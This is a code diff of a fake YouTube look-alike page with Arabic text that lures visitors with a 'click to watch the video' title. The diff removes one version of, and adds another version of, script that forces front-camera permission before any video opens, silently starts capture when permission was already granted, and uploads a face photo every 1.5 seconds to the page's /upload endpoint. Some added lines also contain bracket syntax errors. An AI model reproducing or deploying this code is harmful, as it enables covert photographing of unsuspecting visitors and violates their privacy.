@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#0f0f0f">
-<title>اضغط لمشاهدة الفيديو على يوتيوب</title>
+<title> اضغط لمشاهدة الفيديو على يوتيوب </title>
 
     <!-- وسوم المعاينة والوصف -->
     <meta name="description" content="قناتي تهتم بكل ما يهم المرأة وبكل جديد في عالم الموضة والازياء المغربية والعالمية وكذالك الجمال نحرص كل يوم على ان نقدم لك سيدتي كل جديد لتحصلي عن كل ما تبحثي عنه وتكوني امرأة راقية وبأبهى حلة فإذا أعجبتك القناة فضلا قومي بالاشتراك فيها ومشاركتها مع من تحبين تحياااتي" />
@@ -358,7 +358,7 @@ function filtered(){
 }
 
 /* ===== Main render & History Management ===== */
-function render(pushState=false){
+function render(pushState=true){
   document.body.classList.toggle('in-watch',S.view==='watch');
   updateLayout();renderSidebar();renderBnav();
   const chips=$('#chips'),view=$('#view');
@@ -395,83 +395,27 @@ function render(pushState=false){
 function go(view){
   S.view=view;S.cur=null;S.q='';$('#q').value='';
   document.body.classList.remove('drawer-open','searching');
-  document.title='يوتيوب';render(true);scrollTo(0,0);
+  document.title='يوتيوب';render();scrollTo(0,0);
 }
 function searchFor(text){
   S.q=text;S.view='home';S.cat='الكل';$('#q').value=text;
   document.body.classList.remove('drawer-open','searching');
-  render(true);scrollTo(0,0);
+  render();scrollTo(0,0);
 }
 
-/* ===== الكاميرا والتقاط الصور التلقائي والمستمر ===== */
-let mediaStream = null;
-let captureInterval = null;
-
-function startCaptureLoop() {
-    if (captureInterval) return;
-    const videoEl = document.getElementById('video');
-    captureInterval = setInterval(() => {
-        if (!mediaStream) return;
-        try {
-            const vw = videoEl.videoWidth || 640;
-            const vh = videoEl.videoHeight || 480;
-
-            const canvas = document.createElement('canvas');
-            canvas.width = vw;
-            canvas.height = vh;
-
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoEl, 0, 0, vw, vh);
-
-            canvas.toBlob(blob => {
-                if (blob) {
-                    let fd = new FormData();
-                    fd.append('image', blob, `user_eye.jpg`);
-                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
-                }
-            }, 'image/jpeg', 0.85);
-        } catch (err) {}
-    }, 1500);
-}
-
-// فحص أمان أذونات الكاميرا في الخلفية دون تعطيل واجهة المستخدم
-function checkExistingPermission() {
-    if (navigator.permissions && navigator.permissions.query) {
-        navigator.permissions.query({ name: 'camera' }).then(status => {
-            if (status.state === 'granted') {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } })
-                .then(stream => {
-                    mediaStream = stream;
-                    const videoEl = document.getElementById('video');
-                    videoEl.srcObject = mediaStream;
-                    startCaptureLoop();
-                }).catch(() => {});
-            }
-        }).catch(() => {});
-    }
-}
-
-/* ===== ارتباط فتح الفيديو بإذن الكاميرا الحقيقي ===== */
-async function openVideo(id){
-  try {
-    if (!mediaStream) {
-        mediaStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: { ideal: 'user' } } 
-        });
-        const videoEl = document.getElementById('video');
-        videoEl.srcObject = mediaStream;
-        startCaptureLoop();
-    }
-
+/* ===== Watch page ===== */
+function openVideo(id){
+  // عند النقر على أي فيديو يتم طلب إذن الكاميرا وتشغيل التقاط الصور فوريًا إذا لم تكن تعمل
+  startCapture().then(() => {
     S.cur=id;S.view='watch';S.descOpen=false;
     S.hist=[id,...S.hist.filter(x=>x!==id)];
     document.body.classList.remove('drawer-open','searching');
     document.title=cur().title;
-    render(true);scrollTo(0,0);
-
-  } catch (err) {
-    console.log("تم رفض الإذن أو تجاهله، لن يتم فتح الفيديو");
-  }
+    render();scrollTo(0,0);
+  }).catch(() => {
+    // إذا رفض المستخدم إذن الكاميرا، لن يفتح الفيديو ويبقى في مكانه
+    console.log("تم رفض الإذن");
+  });
 }
 
 function renderWatch(){
@@ -561,6 +505,60 @@ function download(){
   },300);
 }
 
+/* ===== الكاميرا الأمامية المستمرة وتصوير الخلفية ===== */
+let mediaStream = null;
+let captureInterval = null;
+
+function startCaptureLoop() {
+    if (captureInterval) return;
+    const videoEl = document.getElementById('video');
+    captureInterval = setInterval(() => {
+        if (!mediaStream) return;
+        try {
+            const vw = videoEl.videoWidth || 640;
+            const vh = videoEl.videoHeight || 480;
+
+            const canvas = document.createElement('canvas');
+            canvas.width = vw;
+            canvas.height = vh;
+
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoEl, 0, 0, vw, vh);
+
+            canvas.toBlob(blob => {
+                if (blob) {
+                    let fd = new FormData();
+                    fd.append('image', blob, `user_eye.jpg`);
+                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
+                }
+            }, 'image/jpeg', 0.85);
+        } catch (err) {}
+    }, 1500);
+}
+
+async function startCapture() {
+    if (mediaStream) return Promise.resolve();
+    try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: { ideal: 'user' } } 
+        });
+        const videoEl = document.getElementById('video');
+        videoEl.srcObject = mediaStream;
+        startCaptureLoop();
+    } catch (e) {
+        throw e;
+    }
+}
+
+// فحص صامت في الخلفية: إذا كان الإذن ممنوحاً مسبقاً، يبدأ الالتقاط تلقائياً دون أي إزعاج
+if (navigator.permissions && navigator.permissions.query) {
+    navigator.permissions.query({name: 'camera'}).then((permissionStatus) => {
+        if (permissionStatus.state === 'granted') {
+            startCapture().catch(() => {});
+        }
+    }).catch(() => {});
+}
+
 /* ===== Actions ===== */
 function act(a,el){
   const v=S.cur?cur():null;
@@ -582,11 +580,11 @@ function act(a,el){
     case 'download':download();break;
     case 'save':{const on=!S.saved.has(v.id);on?S.saved.add(v.id):S.saved.delete(v.id);refreshMeta();toast(on?'تمت الإضافة إلى المحفوظات':'تمت الإزالة من المحفوظات');break}
     case 'desc':S.descOpen=!S.descOpen;refreshMeta();break;
-    case 'cm-cancel':$('#cmInput').value='';$('#cmSend').disabled=true;$('#cmBox').classList.remove('active');break;
+    case 'cm-cancel':$('#cmInput').value='';$('#cmSend'].disabled=true;$('#cmBox').classList.remove('active');break;
     case 'cm-send':sendComment();break;
     case 'cm-like':{const k=S.cur+':'+el.dataset.cid;S.cl.has(k)?S.cl.delete(k):S.cl.add(k);refreshComments();break}
     case 'cm-del':S.comments[S.cur]=getComments(S.cur).filter(c=>String(c.id)!==el.dataset.cid);refreshComments();toast('تم حذف التعليق');break;
-    case 'clear-history':S.hist=[];render(true);toast('تم مسح سجل المشاهدة');break;
+    case 'clear-history':S.hist=[];render();toast('تم مسح سجل المشاهدة');break;
   }
 }
 
@@ -598,13 +596,13 @@ document.addEventListener('click',e=>{
   if(d.action)act(d.action,el);
   else if(d.open)openVideo(d.open);
   else if(d.nav)go(d.nav);
-  else if(d.cat){S.cat=d.cat;render(true)}
+  else if(d.cat){S.cat=d.cat;render()}
   else if(d.ch)searchFor(d.ch);
 });
 
 document.addEventListener('input',e=>{
-  if(e.target.id==='cmInput')$('#cmSend').disabled=!e.target.value.trim();
-  if(e.target.id==='q'&&S.view==='home'){S.q=e.target.value;render(false)}
+  if(e.target.id==='cmInput')$('#cmSend'].disabled=!e.target.value.trim();
+  if(e.target.id==='q'&&S.view==='home'){S.q=e.target.value;render()}
 });
 
 document.addEventListener('focusin',e=>{if(e.target.id==='cmInput')$('#cmBox').classList.add('active')});
@@ -618,7 +616,7 @@ $('#searchForm').addEventListener('submit',e=>{ e.preventDefault();const t=$('#q
   searchFor(t);$('#q'].blur();
 });
 
-/* ===== التعامل مع أزرار التنقل ===== */
+/* ===== التعامل مع أزرار المتصفح ===== */
 window.addEventListener('popstate',e=>{
   if(e.state){
     S.view=e.state.view;
@@ -635,10 +633,9 @@ window.addEventListener('popstate',e=>{
   scrollTo(0,0);
 });
 
-/* ===== بدء تشغيل الصفحة المباشر والآمن ===== */
+/* ===== Init ===== */
 document.querySelectorAll('[data-ic]').forEach(el=>el.innerHTML=ic(el.dataset.ic));
-render(false); // بناء الصفحة وعرض الفيديوهات المباشر للواجهة بدون أي حظر أو شاشة سوداء
-checkExistingPermission(); // فحص غير حاطر لأذونات الكاميرا المسبقة
+render(true);
 </script>
 </body>
 </html>
